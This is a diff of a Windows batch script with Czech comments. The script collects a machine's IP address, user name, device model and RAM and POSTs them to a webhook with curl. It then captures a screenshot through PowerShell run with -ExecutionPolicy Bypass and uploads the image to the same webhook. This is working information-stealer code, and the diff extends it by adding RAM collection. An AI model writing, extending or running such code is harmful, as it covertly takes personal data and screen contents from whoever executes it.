@@ -41,20 +41,32 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
     )
 )
 
-:: 🧾 Zpráva – každá položka na novém řádku, IP s || před i za
-set "msg=🛰️ **Systémové info**"
-set "msg=!msg!\nIP: ||!ip! ||"
-set "msg=!msg!\nČas: !timestamp!"
-set "msg=!msg!\nUživatel: !user!"
-set "msg=!msg!\nZařízení: !deviceType!"
-set "msg=!msg!\nModel: !deviceModel!"
+:: 🧠 RAM
+for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
+set /a ram=%ramRaw:~0,-6%
+
+:: 🧾 Zpráva – každý údaj na novém řádku
+set "msg=🛰️ **Systémové info:**^
+IP: ||!ip! ||^
+Čas: !timestamp!^
+Uživatel: !user!^
+Zařízení: !deviceType!^
+Model: !deviceModel!^
+RAM: !ram! GB"
 
 :: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
 
 :: 📸 Screenshot
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
-powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
+powershell -ExecutionPolicy Bypass -Command ^
+"Add-Type -AssemblyName System.Windows.Forms; ^
+Add-Type -AssemblyName System.Drawing; ^
+$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; ^
+$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height; ^
+$graphics = [Drawing.Graphics]::FromImage($bmp); ^
+$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size); ^
+$bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
 if exist "%ss%" (
     curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
